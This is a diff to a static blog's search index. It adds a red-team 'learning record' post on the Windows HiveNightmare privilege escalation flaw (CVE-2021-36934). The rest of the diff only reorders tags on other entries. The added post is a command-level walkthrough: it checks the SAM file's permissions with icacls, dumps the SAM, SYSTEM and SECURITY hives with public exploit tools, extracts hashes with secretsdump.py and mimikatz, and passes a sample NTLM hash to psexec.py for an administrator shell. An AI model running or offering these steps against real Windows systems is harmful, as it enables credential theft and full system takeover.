@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>CVE-2021-36934 Windows Privilege promotion</title>
+      <link href="2021/08/17/cve-2021-36934-windows-privilege-promotion/"/>
+      <url>2021/08/17/cve-2021-36934-windows-privilege-promotion/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">A privilege promotion vulnerability exists because access control lists (ACLs) are too loose on multiple system files, including the Security Account Manager (SAM) database. An attacker who successfully exploits this vulnerability can run arbitrary code with SYSTEM privileges. The attacker can then install the program; View, change, or delete data; Or create a new account with full user rights<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Vulnerability-detection"><a href="#Vulnerability-detection" class="headerlink" title="Vulnerability detection"></a>Vulnerability detection</h2><pre class="line-numbers language-none"><code class="language-none">icacls c:\windows\system32\config\samConfirming permissions is risky<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817224055847.png"></p><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><h3 id="Get-hash"><a href="#Get-hash" class="headerlink" title="Get hash"></a>Get hash</h3><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><pre class="line-numbers language-none"><code class="language-none">Compile relevant files  https:&#x2F;&#x2F;github.com&#x2F;GossiTheDog&#x2F;HiveNightmareExecute hivenightcare.exe under the normal account, and the Sam, system and security files will be output in the current directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817224634530.png"></p><pre class="line-numbers language-none"><code class="language-none">Using the secretsdump.py，like this you will be get tar hashpython3 secretsdump.py -system SYSTEM-2021-08-03 -security SECURITY-2021-08-03 -sam SAM-2021-08-03 local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817225128526.png"></p><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><pre class="line-numbers language-none"><code class="language-none">Compile relevant files  https:&#x2F;&#x2F;github.com&#x2F;cube0x0&#x2F;CVE-2021-36934One step in place，get hash like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817230352171.png"></p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre class="line-numbers language-none"><code class="language-none">Users with normal permissions get shadowcopy volume <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817230352171.png"></p><pre class="line-numbers language-none"><code class="language-none">Easy to get hashlsadump::sam &#x2F;system:   &#x2F;sam:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/CVE-2021-36934%20Windows%20Privilege%20promotion/image-20210817230516328.png"></p><h3 id="Get-system"><a href="#Get-system" class="headerlink" title="Get system"></a>Get system</h3><pre class="line-numbers language-none"><code class="language-none">Easy to get like thispython psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2d7f1a5a61d3a96fb5159b5eef17adc6 administrator@192.168.3.8 cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Learning record </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Redteam </tag>
+            
+            <tag> CVE-2021-36934 </tag>
+            
+            <tag> Windows Privilege promotion </tag>
+            
+            <tag> Mimikatz </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Sqlserver focus command</title>
       <link href="2021/08/16/sqlserver-focus-command/"/>
       <url>2021/08/16/sqlserver-focus-command/</url>
@@ -94,9 +125,9 @@
             
             <tag> Bypass </tag>
             
-            <tag> Powershell </tag>
-            
             <tag> Cobaltstrike </tag>
+            
+            <tag> Powershell </tag>
             
         </tags>
       
@@ -214,13 +245,13 @@
             
             <tag> Redteam </tag>
             
-            <tag> Bypass </tag>
-            
             <tag> Mimikatz </tag>
             
-            <tag> Catch Password </tag>
+            <tag> Bypass </tag>
             
             <tag> Powershell </tag>
+            
+            <tag> Catch Password </tag>
             
         </tags>
       
